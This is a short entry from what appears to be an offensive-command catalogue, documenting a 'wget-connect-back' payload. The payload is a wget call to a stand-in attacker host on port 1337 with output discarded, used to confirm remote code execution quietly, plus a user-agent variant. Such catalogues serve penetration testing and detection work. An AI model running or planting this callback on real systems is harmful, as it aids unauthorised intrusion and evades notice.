---
data: 'wget -O- 1.2.3.4:1337 > /dev/null'
tags:
  - rce
  - callback
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.337Z'
id: d431d018-4480-4a4b-9bb1-62a6e43eaf74
verified: false
validated: true
submitted: true
---
# wget-connect-back

## Command

```bash
wget -O- 1.2.3.4:1337 > /dev/null
```

## Description

This command downloads content from an attacker-controlled server on port 1337 to stdout and discards the output, effectively sending an HTTP GET request to establish a connection back, demonstrating RCE without leaving visible traces.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-O-` | Output to stdout instead of a file | Yes |
| `1.2.3.4:1337` | Attacker's IP and port | Yes |
| `> /dev/null` | Redirect output to suppress it | Yes |

## Examples

### Basic Usage

```bash
wget -O- 1.2.3.4:1337 > /dev/null
```

### Advanced Usage

For binding to a specific interface or adding user-agent:

```bash
wget -O- --user-agent="Mozilla/5.0" 1.2.3.4:1337 > /dev/null
```

## Expected Output

No visible output due to redirection; success indicated by HTTP request logged on the attacker server (e.g., GET / HTTP/1.1 from target IP).

## Related

- [[Related Procedure]]
